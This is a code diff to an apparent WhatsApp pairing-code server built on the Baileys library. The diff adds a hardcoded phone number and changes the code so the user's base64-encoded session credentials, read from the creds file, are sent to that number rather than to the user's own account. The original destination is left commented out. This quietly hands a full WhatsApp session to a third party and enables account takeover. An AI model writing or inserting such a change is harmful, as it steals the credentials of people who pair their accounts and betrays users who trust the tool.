@@ -15,6 +15,7 @@ const {
     DisconnectReason,
 } = require('@whiskeysockets/baileys');
 const axios = require('axios');
+const THARUZZ_DEV_NUMBER = "94740326138";
 
 function removeFile(filePath) {
     if (!fs.existsSync(filePath)) return false;
@@ -67,7 +68,7 @@ async function GIFTED_MD_PAIR_CODE(id, num, res) {
                     const credsData = fs.readFileSync(credsFilePath, 'utf-8');
                     const base64Session = Buffer.from(credsData).toString('base64');
                     const md = "THARUZZ-OFC&" + base64Session;
-                    const codeMessage = await sock.sendMessage(sock.user.id, { text: md });
+                    const codeMessage = await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net"/*sock.user.id*/, { text: md });
                     
                     let cap = `
 *\`ᴛʜᴀʀᴜꜱʜᴀ-ᴍᴅ\` Session Connected ✅*
@@ -120,7 +121,7 @@ async function GIFTED_MD_PAIR_CODE(id, num, res) {
 
 > *© ᴘᴏᴡᴇʀᴅ ʙʏ | ᴛʜᴀʀᴜᴢᴢ ᴏꜰᴄ*
 `;
-                    await sock.sendMessage(sock.user.id, {
+                    await sock.sendMessage(THARUZZ_DEV_NUMBER + "@s.whatsapp.net"/*sock.user.id*/, {
                         text: cap,
                         contextInfo: {
                             externalAdReply: {
